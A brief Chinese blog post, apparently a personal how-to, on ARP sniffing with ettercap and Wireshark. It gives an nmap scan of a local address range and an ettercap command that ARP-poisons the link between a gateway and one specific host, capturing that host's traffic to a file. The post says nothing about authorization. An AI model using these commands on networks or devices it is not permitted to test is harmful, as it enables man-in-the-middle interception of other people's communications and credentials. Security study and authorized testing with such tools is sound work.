---
layout:     post
title:      "ettercap和wireshark配合进行arp嗅探"
subtitle:   ""
date:       2017-01-29 12:00:00
author:     "Ives"
header-img: "img/post-bg-2015.jpg"
catalog: true
tags:
- 无线
- Wifi
---

## 1. ettercap和Wireshark安装
```shell
sudo apt-get install wireshark
sudo apt-get install ettercap-graphical
```
## 2. 开始嗅探

###### 扫描主机192.168.0.100至192.168.0.150中活动的主机
```shell
nmap 192.168.0.100-150
```
###### 查看无线网卡
```shell
iwconfig
```
###### 对192.168.0.114进行arp嗅探
保存嗅探到的数据到host114
使用无线网卡wlo1
```shell
sudo ettercap -Tq -w host114 -i wlo1 -M arp:remote /192.168.0.1// /192.168.0.114//
```

[http://topspeedsnail.com/kali-linux-preform-man-in-middle-attack/](http://topspeedsnail.com/kali-linux-preform-man-in-middle-attack/ "http://topspeedsnail.com/kali-linux-preform-man-in-middle-attack/")


